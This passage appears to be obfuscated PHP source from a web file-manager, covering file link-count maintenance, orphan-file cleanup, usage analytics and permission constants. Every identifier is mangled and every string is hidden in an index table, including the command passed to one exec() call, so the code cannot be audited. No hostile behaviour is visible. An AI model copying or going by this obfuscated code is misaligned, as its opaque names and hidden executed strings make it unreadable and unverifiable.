intval($»’Í§ÁÊ[$¨¦ç¦¬‚[2198]]) + 1, $¨¦ç¦¬‚[646] => $¹™Œ¤±); $this->where(array($¨¦ç¦¬‚[564] => $»’Í§ÁÊ[$¨¦ç¦¬‚[563]]))->save($…‡·­Ø³); return $»’Í§ÁÊ; } public function remove($ÑÚ„áë) { $this->linkCountChange($ÑÚ„áë, !1); $this->clearEmpty(); return !0; } public function linkAdd($¹ÛÂ«•) { $this->linkCountChange($¹ÛÂ«•, !0); } public function linkCountChange($ªàé›Ğ, $êö®”·) { $ ®“ÄØ =& $_SERVER[¤øïŠ‹²]; if (!$ªàé›Ğ) { return; } if (!is_array($ªàé›Ğ)) { $ªàé›Ğ = array($ªàé›Ğ); } $ ˜œ¡˜ = array(); foreach ($ªàé›Ğ as $âÙ¬¤²„) { $ŒÄë¬Æ = $âÙ¬¤²„ . $ ®“ÄØ[12]; if (!$ ˜œ¡˜[$ŒÄë¬Æ]) { $ ˜œ¡˜[$ŒÄë¬Æ] = 0; } $ ˜œ¡˜[$ŒÄë¬Æ]++; } $Ö†”â = array(); foreach ($ ˜œ¡˜ as $âÙ¬¤²„ => $´µè¶†±) { $ŒÄë¬Æ = $´µè¶†± . $ ®“ÄØ[12]; if (!$Ö†”â[$ŒÄë¬Æ]) { $Ö†”â[$ŒÄë¬Æ] = array(); } $Ö†”â[$ŒÄë¬Æ][] = $âÙ¬¤²„; } foreach ($Ö†”â as $´µè¶†± => $Áîå½¥Æ) { if (!$Áîå½¥Æ) { continue; } $´µè¶†± = $êö®”· ? $´µè¶†± : -intval($´µè¶†±); $ıÌî˜Š’ = array($ ®“ÄØ[563] => array($ ®“ÄØ[7], $Áîå½¥Æ)); if ($´µè¶†± < 0) { $ıÌî˜Š’[$ ®“ÄØ[2198]] = array($ ®“ÄØ[1131], abs($´µè¶†±)); } $this->where($ıÌî˜Š’)->setAdd($ ®“ÄØ[2198], $´µè¶†±); } } public function findByHash($˜Í™‰Àû, $ŠÒ²÷ú¡ = false) { $±ˆ¤Äå =& $_SERVER[¤øïŠ‹²]; if (!$˜Í™‰Àû && !$ŠÒ²÷ú¡) { return !1; } $…€şŞÖ‹ = array($±ˆ¤Äå[2192] => $˜Í™‰Àû); if ($ŠÒ²÷ú¡) { $…€şŞÖ‹ = array($±ˆ¤Äå[2193] => $ŠÒ²÷ú¡); } return $this->order($±ˆ¤Äå[2199])->where($…€şŞÖ‹)->find(); } public function clearEmpty($·çÈåâÖ = 1) { $Öğ³£‰ë =& $_SERVER[¤øïŠ‹²]; $è×÷î˜ë = time() - 3600 * 24 * $·çÈåâÖ; $»·Ç „² = $Öğ³£‰ë[2200] . $è×÷î˜ë; $Ëòó±ñÕ = $this->where($»·Ç „²)->select(); if (!$Ëòó±ñÕ) { return; } $Øàô–Ïê = new Task($Öğ³£‰ë[2201], $Öğ³£‰ë[12], count($Ëòó±ñÕ)); foreach ($Ëòó±ñÕ as $Ö¸ë›Ì) { $Øàô–Ïê->update(1); $this->resetFile($Ö¸ë›Ì); } $Øàô–Ïê->end(); } public function resetFile($äÁğ×¬¼) { $¿Íïß—à =& $_SERVER[¤øïŠ‹²]; $Ìë‡ìë = array($¿Íïß—à[564] => $äÁğ×¬¼[$¿Íïß—à[563]]); $ÑÕÉ€øç = Model($¿Íïß—à[1482])->where($Ìë‡ìë)->count(); $Âƒ½Ø = Model($¿Íïß—à[2202])->where($Ìë‡ìë)->count(); $³ıÈ£…¬ = intval($ÑÕÉ€øç) + intval($Âƒ½Ø); if ($³ıÈ£…¬ == 0) { Model($¿Íïß—à[2203])->delete($äÁğ×¬¼[$¿Íïß—à[563]]); $this->where($Ìë‡ìë)->delete(); $this->metaSet($äÁğ×¬¼[$¿Íïß—à[563]], null, null); if (!IO::isFile($äÁğ×¬¼[$¿Íïß—à[98]])) { write_log(array($¿Íïß—à[2204], ACTION, $äÁğ×¬¼), $¿Íïß—à[1317]); return !1; } IO::remove($äÁğ×¬¼[$¿Íïß—à[98]]); write_log(ACTION . $¿Íïß—à[942] . KodUser::id() . $¿Íïß—à[2205] . $äÁğ×¬¼[$¿Íïß—à[563]] . $¿Íïß—à[1994] . $äÁğ×¬¼[$¿Íïß—à[90]] . $¿Íïß—à[212] . $äÁğ×¬¼[$¿Íïß—à[98]], $¿Íïß—à[2204]); return; } if ($äÁğ×¬¼[$¿Íïß—à[2198]] != $³ıÈ£…¬) { $this->where($Ìë‡ìë)->save(array($¿Íïß—à[2191] => $³ıÈ£…¬)); } } public function storageInfo($³¥Êş²ş = false) { $¼½šòÕŸ =& $_SERVER[¤øïŠ‹²]; $–ºÍ©îØ = $this->count() + 0.0; $¯Ú¤ããÃ = 0; $ëªÕùŸ¦ = 1; $…ˆ›şà’ = 0; $á²É¾¡… = 5000; for ($—ÖĞÅç¯ = 0; $—ÖĞÅç¯ < $–ºÍ©îØ; $—ÖĞÅç¯ = $—ÖĞÅç¯ + $á²É¾¡…) { $øÍÛßŒŒ = $this->limit($—ÖĞÅç¯, $—ÖĞÅç¯ + $á²É¾¡…)->select(); foreach ($øÍÛßŒŒ as $Ç÷…©æ©) { $ëªÕùŸ¦ += $Ç÷…©æ©[$¼½šòÕŸ[90]] * $Ç÷…©æ©[$¼½šòÕŸ[2198]]; $¯Ú¤ããÃ += $Ç÷…©æ©[$¼½šòÕŸ[90]] * ($Ç÷…©æ©[$¼½šòÕŸ[2198]] - 1); $…ˆ›şà’ += $Ç÷…©æ©[$¼½šòÕŸ[2198]]; } } $± £ëáÀ = array($¼½šòÕŸ[2206] => $ëªÕùŸ¦, $¼½šòÕŸ[2207] => $¯Ú¤ããÃ, $¼½šòÕŸ[2208] => $¯Ú¤ããÃ / $ëªÕùŸ¦, $¼½šòÕŸ[94] => $–ºÍ©îØ, $¼½šòÕŸ[2209] => $…ˆ›şà’); return $± £ëáÀ; } } goto a’°”©÷…Ş; d°ê»Èêƒ’: class AnalysisModel extends ModelBaseLight { public function init($¦ã¸ÒÙÛ) { $ÕÚ¬½ä³ =& $_SERVER[¤øïŠ‹²]; $ö‰ÎóÅˆ = array($ÕÚ¬½ä³[691] => array($ÕÚ¬½ä³[33] => $ÕÚ¬½ä³[2063], $ÕÚ¬½ä³[363] => array($ÕÚ¬½ä³[295], $ÕÚ¬½ä³[867], $ÕÚ¬½ä³[2064], $ÕÚ¬½ä³[2065])), $ÕÚ¬½ä³[2066] => array($ÕÚ¬½ä³[33] => $ÕÚ¬½ä³[2067], $ÕÚ¬½ä³[363] => array($ÕÚ¬½ä³[295], $ÕÚ¬½ä³[865], $ÕÚ¬½ä³[2068], $ÕÚ¬½ä³[2069], $ÕÚ¬½ä³[2070]))); if (!isset($ö‰ÎóÅˆ[$¦ã¸ÒÙÛ])) { return !1; } $this->optionType = $ö‰ÎóÅˆ[$¦ã¸ÒÙÛ][$ÕÚ¬½ä³[33]]; $this->field = $ö‰ÎóÅˆ[$¦ã¸ÒÙÛ][$ÕÚ¬½ä³[363]]; return !0; } public function listData($Î—Ô¾³ = false, $Ø­­°ìó = "\x6d\x6f\x64\151\146\x79\x54\x69\x6d\145", $óŠÎ™Ô„ = false) { return parent::listData($Î—Ô¾³, $Ø­­°ìó, $óŠÎ™Ô„); } public function trendList($èÓü¨Ç‹) { $²ôªÏÒ’ =& $_SERVER[¤øïŠ‹²]; $‚‡ĞŠ¨³ = $this->listData(); if ($‚‡ĞŠ¨³) { $˜·ÈÕ¨Ã = end($‚‡ĞŠ¨³); $ÊêÃƒØ = date($²ôªÏÒ’[2071], strtotime($²ôªÏÒ’[2072])); if ($˜·ÈÕ¨Ã[$²ôªÏÒ’[295]] == $ÊêÃƒØ) { return $‚‡ĞŠ¨³; } $î¶úÄÌã = strtotime($˜·ÈÕ¨Ã[$²ôªÏÒ’[295]]); } if (!isset($î¶úÄÌã)) { $Û†Ò•±» = $èÓü¨Ç‹ == $²ôªÏÒ’[691] ? $²ôªÏÒ’[623] : $²ôªÏÒ’[934]; $î¶úÄÌã = Model($Û†Ò•±»)->min($²ôªÏÒ’[244]); } $šœã—Ëš = $²ôªÏÒ’[2073] . ucfirst($èÓü¨Ç‹); $¿ÀµÆ’ = $this->dateList($î¶úÄÌã); foreach ($¿ÀµÆ’ as $ÊêÃƒØ) { $this->{$šœã—Ëš}($ÊêÃƒØ); } return $this->listData(); } private function dateList($™Ëöœ·ö) { $Â›‹³ =& $_SERVER[¤øïŠ‹²]; $³»šô¹ = $™Ëöœ·ö; $ıùÏä‘Ä = strtotime($Â›‹³[2072]); $ëÀú‘µá = array(); while ($³»šô¹ <= $ıùÏä‘Ä) { $ëÀú‘µá[] = date($Â›‹³[2071], $³»šô¹); $³»šô¹ = strtotime($Â›‹³[2074], $³»šô¹); } return $ëÀú‘µá; } public function _recordUser($ğ±¦éòı = '') { $®·‚şƒú =& $_SERVER[¤øïŠ‹²]; $ÌªìŒ¹ó = strtotime(date($®·‚şƒú[2075], strtotime($ğ±¦éòı))); $ıŞ£ä©¾ = strtotime(date($®·‚şƒú[2076], strtotime($ğ±¦éòı))); $‰ë¦ğ½² = array($®·‚şƒú[244] => array($®·‚şƒú[1129], $ıŞ£ä©¾)); $–’íïÍ¸ = Model($®·‚şƒú[623])->where($‰ë¦ğ½²)->count($®·‚şƒú[1542]); $‰ë¦ğ½²[$®·‚şƒú[244]] = array($®·‚şƒú[420], array($ÌªìŒ¹ó, $ıŞ£ä©¾)); $Åâ¯êÍ = Model($®·‚şƒú[623])->where($‰ë¦ğ½²)->count($®·‚şƒú[1542]); $‰ë¦ğ½²[$®·‚şƒú[33]] = $®·‚şƒú[2077]; $À÷íëÌ¡ = Model($®·‚şƒú[2078])->where($‰ë¦ğ½²)->count($®·‚şƒú[2079]); $ôÒ©Ü¨‡ = array($®·‚şƒú[295] => $ğ±¦éòı, $®·‚şƒú[867] => (int) $–’íïÍ¸, $®·‚şƒú[2064] => (int) $Åâ¯êÍ, $®·‚şƒú[2065] => (int) $À÷íëÌ¡); return $this->insert($ôÒ©Ü¨‡); } public function _recordStore($§²ÇêÏ´ = '') { $äã¦Úš =& $_SERVER[¤øïŠ‹²]; $æ‘™ÊÛõ = strtotime(date($äã¦Úš[2076], strtotime($§²ÇêÏ´))); $ÂÂğ˜ø« = array($äã¦Úš[244] => array($äã¦Úš[1129], $æ‘™ÊÛõ)); $äí·Ä½ò = Model($äã¦Úš[566])->where($ÂÂğ˜ø«)->sum($äã¦Úš[90]); $ÂÂğ˜ø«[$äã¦Úš[506]] = 0; $°ÎÙæÅ = Model($äã¦Úš[934])->where($ÂÂğ˜ø«)->sum($äã¦Úš[90]); $ÂÂğ˜ø«[$äã¦Úš[201]] = 1; $º‚—ØÔù = Model($äã¦Úš[934])->where($ÂÂğ˜ø«)->sum($äã¦Úš[90]); $ÂÂğ˜ø«[$äã¦Úš[201]] = 2; $Üù¤Õ = Model($äã¦Úš[934])->where($ÂÂğ˜ø«)->sum($äã¦Úš[90]); $°ªîé´Ç = array($äã¦Úš[295] => $§²ÇêÏ´, $äã¦Úš[865] => (int) $°ÎÙæÅ, $äã¦Úš[2068] => (int) $äí·Ä½ò, $äã¦Úš[2069] => (int) $º‚—ØÔù, $äã¦Úš[2070] => (int) $Üù¤Õ); return $this->insert($°ªîé´Ç); } public function trend($ù‚á¦ë‘, $¥Ìğß„Á) { $¿Ôıù†± =& $_SERVER[¤øïŠ‹²]; if (!$this->init($ù‚á¦ë‘)) { return !1; } $¹ÑÑ‘°á = $this->trendList($ù‚á¦ë‘); if ($¹ÑÑ‘°á && $¥Ìğß„Á != $¿Ôıù†±[1898]) { $ÏËÚš = $¹ÑÑ‘°á[0][$¿Ôıù†±[295]]; $«±§Ë·¬ = $this->validDate($¥Ìğß„Á, $ÏËÚš); $šš‰ì·Ì = array(); $µ‚»Ìœ = array_to_keyvalue($¹ÑÑ‘°á, $¿Ôıù†±[295]); foreach ($«±§Ë·¬ as $É³ ¶¥Û) { if (isset($µ‚»Ìœ[$É³ ¶¥Û])) { $ŞÓë¦æ“ = $µ‚»Ìœ[$É³ ¶¥Û]; } else { $ŞÓë¦æ“ = end($¹ÑÑ‘°á); $ŞÓë¦æ“[$¿Ôıù†±[295]] = $É³ ¶¥Û; if ($ù‚á¦ë‘ == $¿Ôıù†±[691]) { $ŞÓë¦æ“[$¿Ôıù†±[2064]] = $ŞÓë¦æ“[$¿Ôıù†±[2065]] = 0; } } $šš‰ì·Ì[] = $ŞÓë¦æ“; } $¹ÑÑ‘°á = $šš‰ì·Ì; } $œ´¾İâ = array($¿Ôıù†±[691] => array($¿Ôıù†±[867] => LNG($¿Ôıù†±[2080]), $¿Ôıù†±[2064] => LNG($¿Ôıù†±[2081]), $¿Ôıù†±[2065] => LNG($¿Ôıù†±[2082])), $¿Ôıù†±[2066] => array($¿Ôıù†±[865] => LNG($¿Ôıù†±[2083]), $¿Ôıù†±[2068] => LNG($¿Ôıù†±[2084]), $¿Ôıù†±[2069] => LNG($¿Ôıù†±[2085]), $¿Ôıù†±[2070] => LNG($¿Ôıù†±[2086]))); $¼•œŞØÒ = array($¿Ôıù†±[691] => $¿Ôıù†±[2087], $¿Ôıù†±[2066] => $¿Ôıù†±[90]); if (empty($¹ÑÑ‘°á)) { $É³ ¶¥Û = date($¿Ôıù†±[2071], strtotime($¿Ôıù†±[2072])); $œ§ºÚ¸ˆ = array($¿Ôıù†±[295] => $É³ ¶¥Û); foreach ($œ´¾İâ[$ù‚á¦ë‘] as $ıÖÚÊ¿Ù => $â²‡Æ¤) { $œ§ºÚ¸ˆ[$ıÖÚÊ¿Ù] = 0; } $¹ÑÑ‘°á[] = $œ§ºÚ¸ˆ; } $ŒıÊâã¸ = array(); foreach ($¹ÑÑ‘°á as $â²‡Æ¤) { if ($ù‚á¦ë‘ == $¿Ôıù†±[2066] && $â²‡Æ¤[$¿Ôıù†±[2068]] > $â²‡Æ¤[$¿Ôıù†±[865]]) { $â²‡Æ¤[$¿Ôıù†±[2068]] = $â²‡Æ¤[$¿Ôıù†±[865]]; } foreach ($œ´¾İâ[$ù‚á¦ë‘] as $ıÖÚÊ¿Ù => $ÁÌã¨·) { $ŞÓë¦æ“ = array($¿Ôıù†±[295] => $â²‡Æ¤[$¿Ôıù†±[295]], $¿Ôıù†±[1813] => $ÁÌã¨·); $ŞÓë¦æ“[$¼•œŞØÒ[$ù‚á¦ë‘]] = isset($â²‡Æ¤[$ıÖÚÊ¿Ù]) ? $â²‡Æ¤[$ıÖÚÊ¿Ù] : 0; $ŒıÊâã¸[] = $ŞÓë¦æ“; } } return $ŒıÊâã¸; } public function validDate($ÖÂŸß³, $Æ“†×Ôš) { $Ë©ÍÆåÙ =& $_SERVER[¤øïŠ‹²]; $’ùÌÆ¼ß = date($Ë©ÍÆåÙ[2071], strtotime($Ë©ÍÆåÙ[2072])); $‡š—Ùñİ = array($’ùÌÆ¼ß); switch ($ÖÂŸß³) { case $Ë©ÍÆåÙ[1905]: $óÏíïŠ¸ = mktime(0, 0, 0, date($Ë©ÍÆåÙ[2088]), date($Ë©ÍÆåÙ[1608]) - date($Ë©ÍÆåÙ[1694]) + 7 - 7, date($Ë©ÍÆåÙ[2089])); $ˆİ×¸ûÀ = 0; do { $ã›¨ÚÎ = date($Ë©ÍÆåÙ[2071], $óÏíïŠ¸ - 3600 * 24 * 7 * $ˆİ×¸ûÀ); $‡š—Ùñİ[] = $ã›¨ÚÎ; $ˆİ×¸ûÀ++; } while ($Æ“†×Ôš < $ã›¨ÚÎ); break; case $Ë©ÍÆåÙ[1903]: $ˆİ×¸ûÀ = 1; do { $’»êúßõ = date($Ë©ÍÆåÙ[2090], strtotime("\x2d\40{$ˆİ×¸ûÀ}\x20\155\157\156\164\x68\x73")); $‡š—Ùñİ[] = $’»êúßõ; $ˆİ×¸ûÀ++; } while ($Æ“†×Ôš < $’»êúßõ); break; case $Ë©ÍÆåÙ[2091]: $¬ü™ÛÅñ = (int) date($Ë©ÍÆåÙ[2089], strtotime($Æ“†×Ôš)); $‹ç±Œ¸‘ = (int) date($Ë©ÍÆåÙ[2089]); if ($¬ü™ÛÅñ >= $‹ç±Œ¸‘) { break; } for ($¬ü™ÛÅñ; $¬ü™ÛÅñ < $‹ç±Œ¸‘; $¬ü™ÛÅñ++) { $‡š—Ùñİ[] = $¬ü™ÛÅñ . $Ë©ÍÆåÙ[2092]; } break; default: break; } if ($Æ“†×Ôš > end($‡š—Ùñİ)) { array_pop($‡š—Ùñİ); } sort($‡š—Ùñİ); return $‡š—Ùñİ; } public function listTable($åâ²ÊÓ) { $ˆíŸÅ… = ucfirst($åâ²ÊÓ); return Model($ˆíŸÅ…)->listData(); } public function option($ÁÚÏåªˆ) { return call_user_func_array(array($this, $_SERVER[¤øïŠ‹²][2093] . ucfirst($ÁÚÏåªˆ)), array()); } private function optionUser() { $‘ñÍå¥¯ =& $_SERVER[¤øïŠ‹²]; $Û÷À™ø§ = Model($‘ñÍå¥¯[623])->count($‘ñÍå¥¯[1542]); $ğà°ó€÷ = Model($‘ñÍå¥¯[623])->where($‘ñÍå¥¯[2094])->count($‘ñÍå¥¯[1542]); $ÏüÜ¼¼ = intval($GLOBALS[$‘ñÍå¥¯[6]][$‘ñÍå¥¯[436]][$‘ñÍå¥¯[1871]]) / 3600; $¿€Íù— = strtotime("\55{$ÏüÜ¼¼}\x20\150\x6f\x75\x72\163"); $Ğ¶¹ü©Ê = strtotime(date($‘ñÍå¥¯[2075])); if ($¿€Íù— < $Ğ¶¹ü©Ê) { $¿€Íù— = $Ğ¶¹ü©Ê; } $ìŠÀ´àø = array($‘ñÍå¥¯[2095] => array($‘ñÍå¥¯[1130], $¿€Íù—)); $¸œŞíÆÓ = (int) Model($‘ñÍå¥¯[623])->where($ìŠÀ´àø)->count($‘ñÍå¥¯[1542]); if (!$¸œŞíÆÓ) { $¸œŞíÆÓ = 1; } $ìŠÀ´àø = array($‘ñÍå¥¯[2095] => array($‘ñÍå¥¯[1130], $Ğ¶¹ü©Ê)); $Ğ¸ÔŸ‘« = Model($‘ñÍå¥¯[623])->where($ìŠÀ´àø)->count($‘ñÍå¥¯[1542]); return array($‘ñÍå¥¯[860] => (int) $Û÷À™ø§, $‘ñÍå¥¯[2096] => (int) ($Û÷À™ø§ - $ğà°ó€÷), $‘ñÍå¥¯[2097] => (int) $ğà°ó€÷, $‘ñÍå¥¯[2098] => (int) $Ğ¸ÔŸ‘«, $‘ñÍå¥¯[2099] => $¸œŞíÆÓ); } private function optionFile() { $÷Ö³üâÆ =& $_SERVER[¤øïŠ‹²]; $€³Èë…¾ = $this->sourceSize(); $Ùí¹ı”ñ = $€³Èë…¾[$÷Ö³üâÆ[90]]; $‰¬•¹ßñ = $€³Èë…¾[$÷Ö³üâÆ[2068]]; $Î°€ù‰ = Model($÷Ö³üâÆ[934])->where(array($÷Ö³üâÆ[506] => 0))->count($÷Ö³üâÆ[204]); $ùåÃ¨õé = array($÷Ö³üâÆ[506] => 0, $÷Ö³üâÆ[244] => array($÷Ö³üâÆ[1130], strtotime(date($÷Ö³üâÆ[2075])))); $õĞ¡¥ûï = Model($÷Ö³üâÆ[934])->where($ùåÃ¨õé)->sum($÷Ö³üâÆ[90]); $âÖ Ã ÷ = Model($÷Ö³üâÆ[934])->where($ùåÃ¨õé)->count($÷Ö³üâÆ[204]); return array($÷Ö³üâÆ[865] => $Ùí¹ı”ñ, $÷Ö³üâÆ[2068] => $‰¬•¹ßñ, $÷Ö³üâÆ[2100] => $Ùí¹ı”ñ - $‰¬•¹ßñ, $÷Ö³üâÆ[2101] => (int) $õĞ¡¥ûï, $÷Ö³üâÆ[867] => (int) $Î°€ù‰, $÷Ö³üâÆ[2102] => (int) $âÖ Ã ÷); } private function optionAccess() { $©úæô°² =& $_SERVER[¤øïŠ‹²]; return array($©úæô°²[860] => $this->typeLogCnt(), $©úæô°²[119] => $this->typeLogCnt($©úæô°²[119]), $©úæô°²[545] => $this->typeLogCnt($©úæô°²[545]), $©úæô°²[1280] => $this->typeLogCnt($©úæô°²[1280]), $©úæô°²[1511] => $this->typeLogCnt($©úæô°²[1511]), $©úæô°²[691] => $this->typeLogCnt($©úæô°²[12], $©úæô°²[2079])); } private function typeLogCnt($¢¹à†™‚ = '', $ŒâÚÁ§ = "\x69\x64") { $­ÒÚ·ŒÉ =& $_SERVER[¤øïŠ‹²]; $ƒœÚ·ƒ‹ = array($­ÒÚ·ŒÉ[119] => array($­ÒÚ·ŒÉ[2103], $­ÒÚ·ŒÉ[2104]), $­ÒÚ·ŒÉ[545] => array($­ÒÚ·ŒÉ[2105], $­ÒÚ·ŒÉ[2106]), $­ÒÚ·ŒÉ[1280] => array($­ÒÚ·ŒÉ[2107], $­ÒÚ·ŒÉ[2108], $­ÒÚ·ŒÉ[2109]), $­ÒÚ·ŒÉ[1511] => array($­ÒÚ·ŒÉ[2110], $­ÒÚ·ŒÉ[2111]), $­ÒÚ·ŒÉ[1512] => array($­ÒÚ·ŒÉ[2112], $­ÒÚ·ŒÉ[2113], $­ÒÚ·ŒÉ[2114])); $±†ùñ‚ = strtotime(date($­ÒÚ·ŒÉ[2075])); $ƒ€¹£ƒ­ = array($­ÒÚ·ŒÉ[244] => array($­ÒÚ·ŒÉ[1130], $±†ùñ‚)); if ($¢¹à†™‚) { $ƒ€¹£ƒ­[$­ÒÚ·ŒÉ[33]] = array($­ÒÚ·ŒÉ[7], $ƒœÚ·ƒ‹[$¢¹à†™‚]); } $ØÙ–Ûµ‚ = Model($­ÒÚ·ŒÉ[2078])->where($ƒ€¹£ƒ­)->count($ŒâÚÁ§); return (int) $ØÙ–Ûµ‚; } private function optionServer() { $æ¡ªõ«Ÿ =& $_SERVER[¤øïŠ‹²]; $µû¶Ö¬‚ = $this->diskDriver(); $º¨¨¸Û± = KodIO::defaultDriver(); $Ÿ›œ¤Ê‡ = array($æ¡ªõ«Ÿ[927] => $º¨¨¸Û±[$æ¡ªõ«Ÿ[493]]); $ÒÈ¢ÓÌ† = Model($æ¡ªõ«Ÿ[566])->where($Ÿ›œ¤Ê‡)->sum($æ¡ªõ«Ÿ[90]); $î®’°Å… = explode($æ¡ªõ«Ÿ[53], $_SERVER[$æ¡ªõ«Ÿ[157]]); $„·Õıèï = $î®’°Å…[0]; $Ä¤£°é“ = $GLOBALS[$æ¡ªõ«Ÿ[6]][$æ¡ªõ«Ÿ[21]]; $²àÚŒ• = $Ä¤£°é“[$æ¡ªõ«Ÿ[1092]]; if ($²àÚŒ• == $æ¡ªõ«Ÿ[1080]) { $ö„ï¯´À = explode($æ¡ªõ«Ÿ[1422], $Ä¤£°é“[$æ¡ªõ«Ÿ[1091]]); $²àÚŒ• = $ö„ï¯´À[0]; } if ($²àÚŒ• == $æ¡ªõ«Ÿ[1028] || $²àÚŒ• == $æ¡ªõ«Ÿ[905]) { $±ÍÜÀ¾Ï = Model()->db()->query($æ¡ªõ«Ÿ[2115]); $ÑÖ“¶˜Î = $±ÍÜÀ¾Ï[0] && isset($±ÍÜÀ¾Ï[0][$æ¡ªõ«Ÿ[1812]]) ? $±ÍÜÀ¾Ï[0][$æ¡ªõ«Ÿ[1812]] : 0; $²àÚŒ• = $æ¡ªõ«Ÿ[2116] . ($ÑÖ“¶˜Î ? $æ¡ªõ«Ÿ[8] . $ÑÖ“¶˜Î : $æ¡ªõ«Ÿ[12]); } $ÎˆØËôà = $GLOBALS[$æ¡ªõ«Ÿ[6]][$æ¡ªõ«Ÿ[436]][$æ¡ªõ«Ÿ[936]]; return array($æ¡ªõ«Ÿ[2117] => $µû¶Ö¬‚ ? $µû¶Ö¬‚[$æ¡ªõ«Ÿ[2118]] : 0, $æ¡ªõ«Ÿ[2119] => $µû¶Ö¬‚ ? $µû¶Ö¬‚[$æ¡ªõ«Ÿ[2120]] : 0, $æ¡ªõ«Ÿ[2121] => (int) $º¨¨¸Û±[$æ¡ªõ«Ÿ[2118]] * 1024 * 1024 * 1024, $æ¡ªõ«Ÿ[2122] => (int) $ÒÈ¢ÓÌ†, $æ¡ªõ«Ÿ[2123] => ucfirst($„·Õıèï), $æ¡ªõ«Ÿ[2124] => $æ¡ªõ«Ÿ[2125] . PHP_VERSION, $æ¡ªõ«Ÿ[2126] => phpBuild64() ? 64 : 32, $æ¡ªõ«Ÿ[859] => str_replace($æ¡ªõ«Ÿ[1254], $æ¡ªõ«Ÿ[1108], $²àÚŒ•), $æ¡ªõ«Ÿ[436] => ucfirst($ÎˆØËôà), $æ¡ªõ«Ÿ[32] => $_SERVER[$æ¡ªõ«Ÿ[2127]]); } private function diskDriver() { $÷°§ºÎ¼ =& $_SERVER[¤øïŠ‹²]; $¶õˆÀ¤€ = $÷°§ºÎ¼[8]; $›ıà•Ö’ = $GLOBALS[$÷°§ºÎ¼[6]][$÷°§ºÎ¼[1446]] == $÷°§ºÎ¼[1447]; if ($›ıà•Ö’) { $¶õˆÀ¤€ = $÷°§ºÎ¼[2128]; if (function_exists($÷°§ºÎ¼[2129])) { exec($÷°§ºÎ¼[2130], $åıˆŒ¶è); $¶õˆÀ¤€ = $åıˆŒ¶è[1] . $÷°§ºÎ¼[8]; } } if (!file_exists($¶õˆÀ¤€)) { return; } if (!function_exists($÷°§ºÎ¼[2131])) { return; } $Ëşâİ‚ê = @disk_total_space($¶õˆÀ¤€); $ùÀ¾óùñ = $Ëşâİ‚ê - @disk_free_space($¶õˆÀ¤€); return array($÷°§ºÎ¼[2118] => $Ëşâİ‚ê, $÷°§ºÎ¼[2120] => $ùÀ¾óùñ); } public function fileChart($Öú Üú) { $ìùŠ¸Îñ =& $_SERVER[¤øïŠ‹²]; if (isset($Öú Üú[$ìùŠ¸Îñ[1542]])) { return Model($ìùŠ¸Îñ[934])->userFileTypeProfile($Öú Üú[$ìùŠ¸Îñ[1542]]); } if (isset($Öú Üú[$ìùŠ¸Îñ[1444]])) { return Model($ìùŠ¸Îñ[934])->groupFileTypeProfile($Öú Üú[$ìùŠ¸Îñ[1444]]); } $ïŞÖİ¸¬ = $this->sourceSize(); $§¯½¬İ = array($ìùŠ¸Îñ[203] => 0, $ìùŠ¸Îñ[201] => 1); $®Æîò¢  = Model($ìùŠ¸Îñ[934])->where($§¯½¬İ)->sum($ìùŠ¸Îñ[90]); $§¯½¬İ[$ìùŠ¸Îñ[201]] = 2; $Šï†é¢£ = Model($ìùŠ¸Îñ[934])->where($§¯½¬İ)->sum($ìùŠ¸Îñ[90]); return array($ìùŠ¸Îñ[865] => $ïŞÖİ¸¬[$ìùŠ¸Îñ[90]], $ìùŠ¸Îñ[2068] => $ïŞÖİ¸¬[$ìùŠ¸Îñ[2068]], $ìùŠ¸Îñ[2069] => (int) $®Æîò¢ , $ìùŠ¸Îñ[2070] => (int) $Šï†é¢£); } private function sourceSize() { $ıÊƒ‰à‡ =& $_SERVER[¤øïŠ‹²]; $²•¯›ÚŸ = Model($ıÊƒ‰à‡[934])->where(array($ıÊƒ‰à‡[506] => 0))->sum($ıÊƒ‰à‡[90]); $òÒ¹•Ë‹ = Model($ıÊƒ‰à‡[566])->sum($ıÊƒ‰à‡[90]); if ($òÒ¹•Ë‹ > $²•¯›ÚŸ) { $òÒ¹•Ë‹ = $²•¯›ÚŸ; } return array($ıÊƒ‰à‡[90] => (int) $²•¯›ÚŸ, $ıÊƒ‰à‡[2068] => (int) $òÒ¹•Ë‹); } } class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $Üé××¸Õ =& $_SERVER[¤øïŠ‹²]; $ ÇˆèÍÄ = array(array($Üé××¸Õ[515] => LNG($Üé××¸Õ[2132]), $Üé××¸Õ[2133] => $Üé××¸Õ[2134], $Üé××¸Õ[2135] => 1, $Üé××¸Õ[2136] => 1, $Üé××¸Õ[2137] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($Üé××¸Õ[515] => LNG($Üé××¸Õ[2138]), $Üé××¸Õ[2133] => $Üé××¸Õ[2139], $Üé××¸Õ[2135] => 2, $Üé××¸Õ[2136] => 1, $Üé××¸Õ[2137] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($Üé××¸Õ[515] => LNG($Üé××¸Õ[2140]), $Üé××¸Õ[2133] => $Üé××¸Õ[2141], $Üé××¸Õ[2135] => 3, $Üé××¸Õ[2136] => 1, $Üé××¸Õ[2137] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($Üé××¸Õ[515] => LNG($Üé××¸Õ[2142]), $Üé××¸Õ[2133] => $Üé××¸Õ[2143], $Üé××¸Õ[2135] => 4, $Üé××¸Õ[2136] => 1, $Üé××¸Õ[2137] => self::AUTH_SHOW | self::AUTH_VIEW), array($Üé××¸Õ[515] => LNG($Üé××¸Õ[2144]), $Üé××¸Õ[2133] => $Üé××¸Õ[2145], $Üé××¸Õ[2135] => 5, $Üé××¸Õ[2136] => 1, $Üé××¸Õ[2137] => 